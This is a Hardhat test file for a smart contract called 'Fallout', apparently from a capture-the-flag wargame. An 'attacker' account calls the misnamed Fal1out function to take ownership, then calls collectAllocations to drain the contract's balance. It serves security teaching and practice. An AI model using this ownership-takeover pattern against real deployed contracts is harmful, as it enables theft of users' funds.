import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"

const CONTRACT_NAME = "Fallout"

describe(CONTRACT_NAME, () => {
    let owner: SignerWithAddress;
    let attacker: SignerWithAddress;
    let contract: Contract;
    let tx: TransactionResponse;

    beforeEach(async () => {
        [ owner, attacker ] = await ethers.getSigners()

        const factory = await ethers.getContractFactory(CONTRACT_NAME)
        contract = await factory.deploy()
        await contract.deployed()
    })

    it("Should be possible to claim ownership of the contract", async () => {
        tx = await contract.connect(attacker).Fal1out({ value: 1 })
        await tx.wait()

        tx = await contract.connect(attacker).collectAllocations()
        await tx.wait()

        expect(await ethers.provider.getBalance(contract.address)).to.eq(0)
        expect(await contract.owner()).to.eq(attacker.address)
    })
})


